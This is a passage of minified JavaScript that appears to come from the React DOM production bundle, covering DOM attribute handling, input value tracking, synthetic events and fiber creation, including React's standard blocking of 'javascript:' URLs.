Set,ks={};function Cl(e,t){Wl(e,t),Wl(e+"Capture",t)}function Wl(e,t){for(ks[e]=t,e=0;e<t.length;e++)Rs.add(t[e])}var ch=RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"),Bs={},Ls={};function sh(e){return Ii.call(Ls,e)?!0:Ii.call(Bs,e)?!1:ch.test(e)?Ls[e]=!0:(Bs[e]=!0,!1)}function Hn(e,t,l){if(sh(t))if(l===null)e.removeAttribute(t);else{switch(typeof l){case"undefined":case"function":case"symbol":e.removeAttribute(t);return;case"boolean":var a=t.toLowerCase().slice(0,5);if(a!=="data-"&&a!=="aria-"){e.removeAttribute(t);return}}e.setAttribute(t,""+l)}}function wn(e,t,l){if(l===null)e.removeAttribute(t);else{switch(typeof l){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(t);return}e.setAttribute(t,""+l)}}function Rt(e,t,l,a){if(a===null)e.removeAttribute(l);else{switch(typeof a){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(l);return}e.setAttributeNS(t,l,""+a)}}function vt(e){switch(typeof e){case"bigint":case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function Ys(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function oh(e,t,l){var a=Object.getOwnPropertyDescriptor(e.constructor.prototype,t);if(!e.hasOwnProperty(t)&&typeof a<"u"&&typeof a.get=="function"&&typeof a.set=="function"){var n=a.get,i=a.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return n.call(this)},set:function(u){l=""+u,i.call(this,u)}}),Object.defineProperty(e,t,{enumerable:a.enumerable}),{getValue:function(){return l},setValue:function(u){l=""+u},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function uu(e){if(!e._valueTracker){var t=Ys(e)?"checked":"value";e._valueTracker=oh(e,t,""+e[t])}}function qs(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var l=t.getValue(),a="";return e&&(a=Ys(e)?e.checked?"true":"false":e.value),e=a,e!==l?(t.setValue(e),!0):!1}function Un(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}var fh=/[\n"\\]/g;function St(e){return e.replace(fh,function(t){return"\\"+t.charCodeAt(0).toString(16)+" "})}function cu(e,t,l,a,n,i,u,s){e.name="",u!=null&&typeof u!="function"&&typeof u!="symbol"&&typeof u!="boolean"?e.type=u:e.removeAttribute("type"),t!=null?u==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+vt(t)):e.value!==""+vt(t)&&(e.value=""+vt(t)):u!=="submit"&&u!=="reset"||e.removeAttribute("value"),t!=null?su(e,u,vt(t)):l!=null?su(e,u,vt(l)):a!=null&&e.removeAttribute("value"),n==null&&i!=null&&(e.defaultChecked=!!i),n!=null&&(e.checked=n&&typeof n!="function"&&typeof n!="symbol"),s!=null&&typeof s!="function"&&typeof s!="symbol"&&typeof s!="boolean"?e.name=""+vt(s):e.removeAttribute("name")}function Gs(e,t,l,a,n,i,u,s){if(i!=null&&typeof i!="function"&&typeof i!="symbol"&&typeof i!="boolean"&&(e.type=i),t!=null||l!=null){if(!(i!=="submit"&&i!=="reset"||t!=null)){uu(e);return}l=l!=null?""+vt(l):"",t=t!=null?""+vt(t):l,s||t===e.value||(e.value=t),e.defaultValue=t}a=a??n,a=typeof a!="function"&&typeof a!="symbol"&&!!a,e.checked=s?e.checked:!!a,e.defaultChecked=!!a,u!=null&&typeof u!="function"&&typeof u!="symbol"&&typeof u!="boolean"&&(e.name=u),uu(e)}function su(e,t,l){t==="number"&&Un(e.ownerDocument)===e||e.defaultValue===""+l||(e.defaultValue=""+l)}function Fl(e,t,l,a){if(e=e.options,t){t={};for(var n=0;n<l.length;n++)t["$"+l[n]]=!0;for(l=0;l<e.length;l++)n=t.hasOwnProperty("$"+e[l].value),e[l].selected!==n&&(e[l].selected=n),n&&a&&(e[l].defaultSelected=!0)}else{for(l=""+vt(l),t=null,n=0;n<e.length;n++){if(e[n].value===l){e[n].selected=!0,a&&(e[n].defaultSelected=!0);return}t!==null||e[n].disabled||(t=e[n])}t!==null&&(t.selected=!0)}}function Xs(e,t,l){if(t!=null&&(t=""+vt(t),t!==e.value&&(e.value=t),l==null)){e.defaultValue!==t&&(e.defaultValue=t);return}e.defaultValue=l!=null?""+vt(l):""}function Qs(e,t,l,a){if(t==null){if(a!=null){if(l!=null)throw Error(h(92));if(D(a)){if(1<a.length)throw Error(h(93));a=a[0]}l=a}l==null&&(l=""),t=l}l=vt(t),e.defaultValue=l,a=e.textContent,a===l&&a!==""&&a!==null&&(e.value=a),uu(e)}function $l(e,t){if(t){var l=e.firstChild;if(l&&l===e.lastChild&&l.nodeType===3){l.nodeValue=t;return}}e.textContent=t}var rh=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function Vs(e,t,l){var a=t.indexOf("--")===0;l==null||typeof l=="boolean"||l===""?a?e.setProperty(t,""):t==="float"?e.cssFloat="":e[t]="":a?e.setProperty(t,l):typeof l!="number"||l===0||rh.has(t)?t==="float"?e.cssFloat=l:e[t]=(""+l).trim():e[t]=l+"px"}function Zs(e,t,l){if(t!=null&&typeof t!="object")throw Error(h(62));if(e=e.style,l!=null){for(var a in l)!l.hasOwnProperty(a)||t!=null&&t.hasOwnProperty(a)||(a.indexOf("--")===0?e.setProperty(a,""):a==="float"?e.cssFloat="":e[a]="");for(var n in t)a=t[n],t.hasOwnProperty(n)&&l[n]!==a&&Vs(e,n,a)}else for(var i in t)t.hasOwnProperty(i)&&Vs(e,i,t[i])}function ou(e){if(e.indexOf("-")===-1)return!1;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var dh=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),hh=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function Rn(e){return hh.test(""+e)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":e}function kt(){}var fu=null;function ru(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var Il=null,Pl=null;function Ks(e){var t=Kl(e);if(t&&(e=t.stateNode)){var l=e[et]||null;e:switch(e=t.stateNode,t.type){case"input":if(cu(e,l.value,l.defaultValue,l.defaultValue,l.checked,l.defaultChecked,l.type,l.name),t=l.name,l.type==="radio"&&t!=null){for(l=e;l.parentNode;)l=l.parentNode;for(l=l.querySelectorAll('input[name="'+St(""+t)+'"][type="radio"]'),t=0;t<l.length;t++){var a=l[t];if(a!==e&&a.form===e.form){var n=a[et]||null;if(!n)throw Error(h(90));cu(a,n.value,n.defaultValue,n.defaultValue,n.checked,n.defaultChecked,n.type,n.name)}}for(t=0;t<l.length;t++)a=l[t],a.form===e.form&&qs(a)}break e;case"textarea":Xs(e,l.value,l.defaultValue);break e;case"select":t=l.value,t!=null&&Fl(e,!!l.multiple,t,!1)}}}var du=!1;function Js(e,t,l){if(du)return e(t,l);du=!0;try{var a=e(t);return a}finally{if(du=!1,(Il!==null||Pl!==null)&&(Ai(),Il&&(t=Il,e=Pl,Pl=Il=null,Ks(t),e)))for(t=0;t<e.length;t++)Ks(e[t])}}function Ua(e,t){var l=e.stateNode;if(l===null)return null;var a=l[et]||null;if(a===null)return null;l=a[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(a=!a.disabled)||(e=e.type,a=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!a;break e;default:e=!1}if(e)return null;if(l&&typeof l!="function")throw Error(h(231,t,typeof l));return l}var Bt=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),hu=!1;if(Bt)try{var Ra={};Object.defineProperty(Ra,"passive",{get:function(){hu=!0}}),window.addEventListener("test",Ra,Ra),window.removeEventListener("test",Ra,Ra)}catch{hu=!1}var ll=null,mu=null,kn=null;function Ws(){if(kn)return kn;var e,t=mu,l=t.length,a,n="value"in ll?ll.value:ll.textContent,i=n.length;for(e=0;e<l&&t[e]===n[e];e++);var u=l-e;for(a=1;a<=u&&t[l-a]===n[i-a];a++);return kn=n.slice(e,1<a?1-a:void 0)}function Bn(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function Ln(){return!0}function Fs(){return!1}function tt(e){function t(l,a,n,i,u){this._reactName=l,this._targetInst=n,this.type=a,this.nativeEvent=i,this.target=u,this.currentTarget=null;for(var s in e)e.hasOwnProperty(s)&&(l=e[s],this[s]=l?l(i):i[s]);return this.isDefaultPrevented=(i.defaultPrevented!=null?i.defaultPrevented:i.returnValue===!1)?Ln:Fs,this.isPropagationStopped=Fs,this}return q(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var l=this.nativeEvent;l&&(l.preventDefault?l.preventDefault():typeof l.returnValue!="unknown"&&(l.returnValue=!1),this.isDefaultPrevented=Ln)},stopPropagation:function(){var l=this.nativeEvent;l&&(l.stopPropagation?l.stopPropagation():typeof l.cancelBubble!="unknown"&&(l.cancelBubble=!0),this.isPropagationStopped=Ln)},persist:function(){},isPersistent:Ln}),t}var Ol={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Yn=tt(Ol),ka=q({},Ol,{view:0,detail:0}),mh=tt(ka),yu,pu,Ba,qn=q({},ka,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:vu,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==Ba&&(Ba&&e.type==="mousemove"?(yu=e.screenX-Ba.screenX,pu=e.screenY-Ba.screenY):pu=yu=0,Ba=e),yu)},movementY:function(e){return"movementY"in e?e.movementY:pu}}),$s=tt(qn),yh=q({},qn,{dataTransfer:0}),ph=tt(yh),gh=q({},ka,{relatedTarget:0}),gu=tt(gh),vh=q({},Ol,{animationName:0,elapsedTime:0,pseudoElement:0}),Sh=tt(vh),bh=q({},Ol,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),xh=tt(bh),Th=q({},Ol,{data:0}),Is=tt(Th),Ah={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},Nh={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},jh={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Eh(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=jh[e])?!!t[e]:!1}function vu(){return Eh}var zh=q({},ka,{key:function(e){if(e.key){var t=Ah[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=Bn(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?Nh[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:vu,charCode:function(e){return e.type==="keypress"?Bn(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?Bn(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),Ch=tt(zh),Oh=q({},qn,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Ps=tt(Oh),_h=q({},ka,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:vu}),Mh=tt(_h),Dh=q({},Ol,{propertyName:0,elapsedTime:0,pseudoElement:0}),Hh=tt(Dh),wh=q({},qn,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Uh=tt(wh),Rh=q({},Ol,{newState:0,oldState:0}),kh=tt(Rh),Bh=[9,13,27,32],Su=Bt&&"CompositionEvent"in window,La=null;Bt&&"documentMode"in document&&(La=document.documentMode);var Lh=Bt&&"TextEvent"in window&&!La,eo=Bt&&(!Su||La&&8<La&&11>=La),to=" ",lo=!1;function ao(e,t){switch(e){case"keyup":return Bh.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function no(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var ea=!1;function Yh(e,t){switch(e){case"compositionend":return no(t);case"keypress":return t.which!==32?null:(lo=!0,to);case"textInput":return e=t.data,e===to&&lo?null:e;default:return null}}function qh(e,t){if(ea)return e==="compositionend"||!Su&&ao(e,t)?(e=Ws(),kn=mu=ll=null,ea=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return eo&&t.locale!=="ko"?null:t.data;default:return null}}var Gh={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function io(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!Gh[e.type]:t==="textarea"}function uo(e,t,l,a){Il?Pl?Pl.push(a):Pl=[a]:Il=a,t=_i(t,"onChange"),0<t.length&&(l=new Yn("onChange","change",null,l,a),e.push({event:l,listeners:t}))}var Ya=null,qa=null;function Xh(e){Qr(e,0)}function Gn(e){var t=wa(e);if(qs(t))return e}function co(e,t){if(e==="change")return t}var so=!1;if(Bt){var bu;if(Bt){var xu="oninput"in document;if(!xu){var oo=document.createElement("div");oo.setAttribute("oninput","return;"),xu=typeof oo.oninput=="function"}bu=xu}else bu=!1;so=bu&&(!document.documentMode||9<document.documentMode)}function fo(){Ya&&(Ya.detachEvent("onpropertychange",ro),qa=Ya=null)}function ro(e){if(e.propertyName==="value"&&Gn(qa)){var t=[];uo(t,qa,e,ru(e)),Js(Xh,t)}}function Qh(e,t,l){e==="focusin"?(fo(),Ya=t,qa=l,Ya.attachEvent("onpropertychange",ro)):e==="focusout"&&fo()}function Vh(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return Gn(qa)}function Zh(e,t){if(e==="click")return Gn(t)}function Kh(e,t){if(e==="input"||e==="change")return Gn(t)}function Jh(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var rt=typeof Object.is=="function"?Object.is:Jh;function Ga(e,t){if(rt(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var l=Object.keys(e),a=Object.keys(t);if(l.length!==a.length)return!1;for(a=0;a<l.length;a++){var n=l[a];if(!Ii.call(t,n)||!rt(e[n],t[n]))return!1}return!0}function ho(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function mo(e,t){var l=ho(e);e=0;for(var a;l;){if(l.nodeType===3){if(a=e+l.textContent.length,e<=t&&a>=t)return{node:l,offset:t-e};e=a}e:{for(;l;){if(l.nextSibling){l=l.nextSibling;break e}l=l.parentNode}l=void 0}l=ho(l)}}function yo(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?yo(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function po(e){e=e!=null&&e.ownerDocument!=null&&e.ownerDocument.defaultView!=null?e.ownerDocument.defaultView:window;for(var t=Un(e.document);t instanceof e.HTMLIFrameElement;){try{var l=typeof t.contentWindow.location.href=="string"}catch{l=!1}if(l)e=t.contentWindow;else break;t=Un(e.document)}return t}function Tu(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}var Wh=Bt&&"documentMode"in document&&11>=document.documentMode,ta=null,Au=null,Xa=null,Nu=!1;function go(e,t,l){var a=l.window===l?l.document:l.nodeType===9?l:l.ownerDocument;Nu||ta==null||ta!==Un(a)||(a=ta,"selectionStart"in a&&Tu(a)?a={start:a.selectionStart,end:a.selectionEnd}:(a=(a.ownerDocument&&a.ownerDocument.defaultView||window).getSelection(),a={anchorNode:a.anchorNode,anchorOffset:a.anchorOffset,focusNode:a.focusNode,focusOffset:a.focusOffset}),Xa&&Ga(Xa,a)||(Xa=a,a=_i(Au,"onSelect"),0<a.length&&(t=new Yn("onSelect","select",null,t,l),e.push({event:t,listeners:a}),t.target=ta)))}function _l(e,t){var l={};return l[e.toLowerCase()]=t.toLowerCase(),l["Webkit"+e]="webkit"+t,l["Moz"+e]="moz"+t,l}var la={animationend:_l("Animation","AnimationEnd"),animationiteration:_l("Animation","AnimationIteration"),animationstart:_l("Animation","AnimationStart"),transitionrun:_l("Transition","TransitionRun"),transitionstart:_l("Transition","TransitionStart"),transitioncancel:_l("Transition","TransitionCancel"),transitionend:_l("Transition","TransitionEnd")},ju={},vo={};Bt&&(vo=document.createElement("div").style,"AnimationEvent"in window||(delete la.animationend.animation,delete la.animationiteration.animation,delete la.animationstart.animation),"TransitionEvent"in window||delete la.transitionend.transition);function Ml(e){if(ju[e])return ju[e];if(!la[e])return e;var t=la[e],l;for(l in t)if(t.hasOwnProperty(l)&&l in vo)return ju[e]=t[l];return e}var So=Ml("animationend"),bo=Ml("animationiteration"),xo=Ml("animationstart"),Fh=Ml("transitionrun"),$h=Ml("transitionstart"),Ih=Ml("transitioncancel"),To=Ml("transitionend"),Ao=new Map,Eu="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");Eu.push("scrollEnd");function Ot(e,t){Ao.set(e,t),Cl(t,[e])}var Xn=typeof reportError=="function"?reportError:function(e){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var t=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof e=="object"&&e!==null&&typeof e.message=="string"?String(e.message):String(e),error:e});if(!window.dispatchEvent(t))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",e);return}console.error(e)},bt=[],aa=0,zu=0;function Qn(){for(var e=aa,t=zu=aa=0;t<e;){var l=bt[t];bt[t++]=null;var a=bt[t];bt[t++]=null;var n=bt[t];bt[t++]=null;var i=bt[t];if(bt[t++]=null,a!==null&&n!==null){var u=a.pending;u===null?n.next=n:(n.next=u.next,u.next=n),a.pending=n}i!==0&&No(l,n,i)}}function Vn(e,t,l,a){bt[aa++]=e,bt[aa++]=t,bt[aa++]=l,bt[aa++]=a,zu|=a,e.lanes|=a,e=e.alternate,e!==null&&(e.lanes|=a)}function Cu(e,t,l,a){return Vn(e,t,l,a),Zn(e)}function Dl(e,t){return Vn(e,null,null,t),Zn(e)}function No(e,t,l){e.lanes|=l;var a=e.alternate;a!==null&&(a.lanes|=l);for(var n=!1,i=e.return;i!==null;)i.childLanes|=l,a=i.alternate,a!==null&&(a.childLanes|=l),i.tag===22&&(e=i.stateNode,e===null||e._visibility&1||(n=!0)),e=i,i=i.return;return e.tag===3?(i=e.stateNode,n&&t!==null&&(n=31-ft(l),e=i.hiddenUpdates,a=e[n],a===null?e[n]=[t]:a.push(t),t.lane=l|536870912),i):null}function Zn(e){if(50<dn)throw dn=0,kc=null,Error(h(185));for(var t=e.return;t!==null;)e=t,t=e.return;return e.tag===3?e.stateNode:null}var na={};function Ph(e,t,l,a){this.tag=e,this.key=l,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=a,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function dt(e,t,l,a){return new Ph(e,t,l,a)}function Ou(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Lt(e,t){var l=e.alternate;return l===null?(l=dt(e.tag,t,e.key,e.mode),l.elementType=e.elementType,l.type=e.type,l.stateNode=e.stateNode,l.alternate=e,e.alternate=l):(l.pendingProps=t,l.type=e.type,l.flags=0,l.subtreeFlags=0,l.deletions=null),l.flags=e.flags&65011712,l.childLanes=e.childLanes,l.lanes=e.lanes,l.child=e.child,l.memoizedProps=e.memoizedProps,l.memoizedState=e.memoizedState,l.updateQueue=e.updateQueue,t=e.dependencies,l.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},l.sibling=e.sibling,l.index=e.index,l.ref=e.ref,l.refCleanup=e.refCleanup,l}function jo(e,t){e.flags&=65011714;var l=e.alternate;return l===null?(e.childLanes=0,e.lanes=t,e.child=null,e.subtreeFlags=0,e.memoizedProps=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null,e.stateNode=null):(e.childLanes=l.childLanes,e.lanes=l.lanes,e.child=l.child,e.subtreeFlags=0,e.deletions=null,e.memoizedProps=l.memoizedProps,e.memoizedState=l.memoizedState,e.updateQueue=l.updateQueue,e.type=l.type,t=l.dependencies,e.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),e}function Kn(e,t,l,a,n,i){var u=0;if(a=e,typeof e=="function")Ou(e)&&(u=1);else if(typeof e=="string")u=ny(e,l,H.current)?26:e==="html"||e==="head"||e==="body"?27:5;else e:switch(e){case Xe:return e=dt(31,l,t,n),e.elementType=Xe,e.lanes=i,e;case _e:return Hl(l.children,n,i,t);case Fe:u=8,n|=24;break;case me:return e=dt(12,l,t,n|2),e.elementType=me,e.lanes=i,e;case B:return e=dt(13,l,t,n),e.elementType=B,e.lanes=i,e;case w:return e=dt(19,l,t,n),e.elementType=w,e.lanes=i,e;default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case C:u=10;break e;case Pe:u=9;break e;case Ge:u=11;break e;case O:u=14;break e;case _:u=16,a=null;break e}u=29,l=Error(h(130,e===null?"null":typeof e,"")),a=null}return t=dt(u,l,t,n),t.elementType=e,t.type=a,t.lanes=i,t}function Hl(e,t,l,a){return e=dt(7,e,a,t),e.lanes=l,e}function _u(e,t,l){return e=dt(6,e,null,t),e.lanes=l,e}function Eo(e){var t=dt(18,null,null,0);return t.stateNode=e,t}function Mu(e,t,l){return t=dt(4,e.children!==null?e.children:[],e.key,t),t.lanes=l,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}var zo=new WeakMap;function xt(e,t){if(typeof e=="object"&&e!==null){var l=zo.get(e);return l!==void 0?l:(t={value:e,source:t,stack:js(t)},zo.set(e,t),t)}return{value:e,source:t,stack:js(t)}}var ia=[],ua=0,Jn=null,Qa=0,Tt=[],At=0,al=null,Dt=1,Ht="";function Yt(e,t){ia[ua++]=Qa,ia[ua++]=Jn,Jn=e,Qa=t}function Co(e,t,l){Tt[At++]=Dt,Tt[At++]=Ht,Tt[At++]=al,al=e;var a=Dt;e=Ht;var n=32-ft(a)-1;a&=~(1<<n),l+=1;var i=32-ft(t)+n;if(30<i){var u=n-n%5;i=(a&(1<<u)-1).toString(32),a>>=u,n-=u,Dt=1<<32-ft(t)+n|l<<n|a,Ht=i+e}else Dt=1<<i|l<<n|a,Ht=e}function Du(e){e.return!==null&&(Yt(e,1),Co(e,1,0))}function Hu(e){for(;e===Jn;)Jn=ia[--ua],ia[ua]=null,Qa=ia[--ua],ia[ua]=null;for(;e===al;)al=Tt[--At],Tt[At]=null,Ht=Tt[--At],Tt[At]=null,Dt=Tt[--At],Tt[At]=null}function Oo(e,t){Tt[At++]=Dt,Tt[At++]=Ht,Tt[At++]=al,Dt=t.id,Ht=t.overflow,al=e}var Ve=null,je=null,se=!1,nl=null,Nt=!1,wu=Error(h(519));function il(e){var t=Error(h(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?"text":"HTML",""));throw Va(xt(t,e)),wu}function _o(e){var 